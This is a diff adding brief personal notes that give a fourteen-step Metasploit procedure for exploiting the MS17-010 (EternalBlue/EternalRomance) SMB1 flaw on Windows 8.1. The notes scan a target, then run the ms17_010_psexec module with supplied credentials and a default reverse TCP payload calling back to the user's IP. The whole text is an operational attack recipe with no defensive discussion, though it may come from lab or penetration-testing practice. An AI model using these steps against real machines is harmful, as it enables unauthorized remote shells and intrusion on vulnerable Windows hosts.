@@ -1,0 +1,16 @@
+Notes for SMB1 Vuln on Windows8.1 Vuln ms17-010 EternalBlue / EternalRomance 
+
+1) Open Metasploit (msfconsole)
+2) search ms17-010
+3) use aux/scanner
+4) set RHOSTS to target
+5) run scan 
+6) back
+7) search ms17-010
+8) use exploit/windows/smb/ms17_010_psexec
+9) set RHOSTS again 
+10)set SMBUser USERNAME
+11)set SMBPass PASSWORD
+12)set payload (use default reverse tcp)
+13)set LHOST (userIP)
+14)exploit
